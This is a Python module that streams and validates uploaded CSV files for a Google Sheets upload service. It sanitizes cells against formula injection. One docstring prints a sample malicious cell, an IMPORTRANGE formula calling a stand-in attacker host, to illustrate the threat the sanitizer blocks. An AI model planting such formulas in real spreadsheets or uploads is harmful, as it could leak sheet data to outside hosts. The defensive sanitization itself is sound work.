import csv
import io
import logging
from typing import Generator

logger = logging.getLogger(__name__)

# Characters that Google Sheets interprets as formula starters.
# Any cell beginning with these gets treated as a live formula by Sheets.
# Example: a cell with =SUM(A1:A10) would execute as a real formula.
# We prefix them with an apostrophe so Sheets treats them as plain text.
# The apostrophe is invisible in the cell -- the user just sees their value.
FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(value: str) -> str:
    """
    Blocks CSV injection by prefixing formula-starting characters
    with an apostrophe.

    CSV injection is a known attack where a malicious value like
    '=IMPORTRANGE("http://evil.com","Sheet1!A1")' gets uploaded and
    executes as live code when someone opens the sheet.

    The apostrophe prefix tells Sheets: treat this as literal text,
    not a formula. The apostrophe itself is invisible to the viewer.

    Examples:
        "=SUM(1+1)"  ->  "'=SUM(1+1)"   shown as =SUM(1+1), not executed
        "+1234"      ->  "'+1234"        shown as +1234, not a formula
        "hello"      ->  "hello"         unchanged, no dangerous prefix
    """
    if isinstance(value, str) and value.startswith(FORMULA_PREFIXES):
        return "'" + value
    return value


# =============================================================================
# DISK-BASED FUNCTIONS
# Used by main.py for the deep memory fix.
# Read from a temp file on disk instead of bytes in RAM.
# =============================================================================

def stream_csv_from_disk(file_path: str) -> Generator[list, None, None]:
    """
    Generator that reads a CSV file from DISK one row at a time.

    WHY DISK INSTEAD OF RAM:

    The old approach loaded the whole file into RAM:
        file_bytes = all chunks joined      -> full file in RAM
        content = file_bytes.decode(...)    -> second full copy in RAM
        rows = list(csv.reader(...))        -> third full copy in RAM

    This function reads straight from a temp file on disk.
    csv.reader reads one line at a time from the open file handle.
    Only ONE row exists in memory at any moment -- the current row
    being yielded to the caller.

    For 10 concurrent users uploading 100MB files each:
        Old: 10 x ~300MB = 3,000MB RAM  -> server crashes on 512MB Render
        New: 10 x ~1MB   = ~10MB RAM    -> server handles it fine

    The trade-off: disk reads are slightly slower than RAM reads.
    But disk I/O is fast enough for CSV processing, and the bottleneck
    is always the Google Sheets API -- not reading the file.

    ENCODING DETECTION:
    open() itself never raises UnicodeDecodeError -- it just opens a handle.
    The error only fires when bytes are actually decoded during reading.
    So we sample the first 8KB in binary mode and try to decode that.

    WHY 8KB SAMPLE INSTEAD OF READING THE WHOLE FILE:
    Reading the entire file just for encoding detection would load
    200MB into RAM -- defeating the whole purpose of disk-based streaming.
    8KB is enough to reliably detect encoding. Special characters
    (accented letters, etc.) typically appear near the start of real files.

    WHY NOT errors="replace":
    That silently replaces undecodable bytes with '?' -- corrupting data.
    Better to detect the correct encoding and stream cleanly.

    Args:
        file_path: path to the temp file written during chunked upload

    Yields:
        Each non-empty row as a list of sanitized strings
    """
    # Sample 8KB to detect encoding without loading the whole file into RAM.
    try:
        with open(file_path, "rb") as test_f:
            sample = test_f.read(8192)
        sample.decode("utf-8")
        encoding = "utf-8"
    except UnicodeDecodeError:
        logger.warning(
            f"UTF-8 decoding failed for {file_path}, using latin-1. "
            f"This is normal for Excel-exported CSVs with special characters."
        )
        encoding = "latin-1"

    # Open with the confirmed encoding for actual row-by-row streaming.
    # newline="" is required by csv.reader -- it handles line endings itself
    # and needs raw newlines passed through unchanged.
    # 'with' ensures the file handle is closed even if an exception occurs
    # mid-read, preventing file handle leaks.
    with open(file_path, "r", encoding=encoding, newline="") as f:
        reader = csv.reader(f)

        for row in reader:
            # Skip completely blank rows.
            # any(cell.strip() for cell in row) returns True if at least
            # one cell has non-whitespace content. We skip rows where
            # every cell is empty -- they add nothing to the sheet.
            if not any(cell.strip() for cell in row):
                continue

            # Sanitize every cell before yielding.
            # This is where CSV injection is blocked.
            yield [sanitize_cell(cell) for cell in row]


def validate_csv_from_disk(file_path: str) -> tuple[bool, str, int, int]:
    """
    Validates a CSV file and counts its dimensions in one streaming pass.

    Streams from disk using stream_csv_from_disk -- no full list in RAM.
    Validation, row counting, and column counting all happen in the
    same single loop pass.

    WHY ONE PASS HANDLES EVERYTHING:
    We need three things before creating the Google Sheet:
        1. Is the CSV valid? (has header + at least one data row)
        2. How many rows? (to size the sheet grid correctly)
        3. How many columns? (to size the sheet grid correctly)

    The old code needed the full list in RAM to answer 2 and 3.
    This function counts incrementally as it streams:
        total_rows increments by 1 for each yielded row
        max_cols updates with max() each time a wider row appears
    By the time the loop ends, we have all three answers having
    never held more than one row in memory at once.

    Args:
        file_path: path to the temp file on disk

    Returns:
        (is_valid, error_message, total_rows, total_cols)
        If is_valid is False, total_rows and total_cols are 0.
    """
    header = None
    total_rows = 0
    max_cols = 0

    for row in stream_csv_from_disk(file_path):
        if header is None:
            # The very first non-empty row is the header.
            header = row

            # Validate the header has actual content.
            # A header of ["", "", ""] means all empty cells -- reject it.
            if not any(cell.strip() for cell in header):
                return False, "The header row appears to be empty.", 0, 0

        total_rows += 1

        # max() keeps the running maximum column count.
        # CSV files can be "ragged" -- some rows have fewer columns than
        # others. We size the Google Sheet for the WIDEST row seen
        # so no data gets cut off or falls outside the grid.
        max_cols = max(max_cols, len(row))

    # After streaming all rows, check we have enough data.
    if total_rows == 0:
        return False, "The CSV file is empty.", 0, 0

    # total_rows < 2 means we only got the header, no data rows.
    if total_rows < 2:
        return False, "CSV must have at least a header row and one data row.", 0, 0

    return True, "", total_rows, max_cols


# =============================================================================
# BYTES-BASED FUNCTIONS
# Kept for backwards compatibility -- not used in the main upload flow
# after the deep memory fix, but available if needed elsewhere.
# =============================================================================

def stream_csv(file_bytes: bytes) -> Generator[list, None, None]:
    """
    Generator that yields one sanitized row at a time from raw bytes.

    Bytes-based version -- takes the full file as bytes in memory.
    The same row-by-row yielding and sanitization logic applies,
    just the source is bytes instead of a file path on disk.

    Yields:
        Each non-empty row as a list of sanitized strings
    """
    try:
        content = file_bytes.decode("utf-8")
    except UnicodeDecodeError:
        logger.warning("UTF-8 decoding failed, falling back to latin-1")
        content = file_bytes.decode("latin-1")

    reader = csv.reader(io.StringIO(content))

    for row in reader:
        if not any(cell.strip() for cell in row):
            continue
        yield [sanitize_cell(cell) for cell in row]


def validate_csv_stream(file_bytes: bytes) -> tuple[bool, str, int, int]:
    """
    Validates CSV from bytes and counts dimensions in one streaming pass.
    Bytes-based version -- kept for backwards compatibility.

    Returns:
        (is_valid, error_message, total_rows, total_cols)
    """
    header = None
    total_rows = 0
    max_cols = 0

    for row in stream_csv(file_bytes):
        if header is None:
            header = row
            if not any(cell.strip() for cell in header):
                return False, "The header row appears to be empty.", 0, 0

        total_rows += 1
        max_cols = max(max_cols, len(row))

    if total_rows == 0:
        return False, "The CSV file is empty.", 0, 0

    if total_rows < 2:
        return False, "CSV must have at least a header row and one data row.", 0, 0

    return True, "", total_rows, max_cols